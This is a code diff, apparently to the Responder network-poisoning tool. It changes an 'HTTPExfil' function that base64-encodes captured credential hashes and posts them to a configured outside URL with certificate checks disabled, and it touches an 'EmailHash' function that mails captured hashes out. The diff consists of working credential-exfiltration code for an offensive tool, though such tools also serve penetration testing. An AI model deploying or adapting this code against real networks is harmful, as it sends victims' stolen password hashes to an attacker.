@@ -27,10 +27,14 @@ import struct
 from calendar import timegm
 
 def HTTPExfil(result):
-    result = str(result)
     try:
         if not settings.Config.httpsexfil_enabled:
             return
+        if not settings.Config.httpsexfil_url:
+            print(color("[HTTPS Exfil]",1),"HTTPS Exfil is enabled but not configured. "
+                "Check Responder.conf to configure")
+            return False
+
         # requests isn't in stdlib, so using urllib
         import urllib.parse 
         import urllib.request
@@ -41,12 +45,16 @@ def HTTPExfil(result):
             ctx.check_hostname = False
             ctx.verify_mode = ssl.CERT_NONE
 
-        data = {
-            'hashes' : base64.b64encode(result.encode()),
-        }
+        data = result
+        if type(data) != dict:
+            result = str(result)
+            data = {
+                'hashes' : base64.b64encode(result.encode()),
+            }
+
         data = bytes( urllib.parse.urlencode( data ).encode() )
         handler = urllib.request.urlopen( settings.Config.httpsexfil_url, data , context=ctx)
-        print(color("[HTTPS Exfil]",3,1),"Sent via https exfil")
+        print(color("[HTTPS Exfil]",4,1),"Sent via https exfil")
     except Exception as e:
         print(color("[HTTPS Exfil]",1),"Error sending via HTTPS Exfil{}".format(e))
         return
@@ -78,7 +86,7 @@ def EmailHash(result):
         server.sendmail(settings.Config.emailusername, settings.Config.emailsendto,
                 message)
         server.close()
-        print(color("[EMAIL]",3,1),"Sent email to {}".format(settings.Config.emailsendto))
+        print(color("[EMAIL]",4,1),"Sent email to {}".format(settings.Config.emailsendto))
     except Exception as e:
         print(color("[EMAIL]",1),"Error sending email {}".format(e))
      
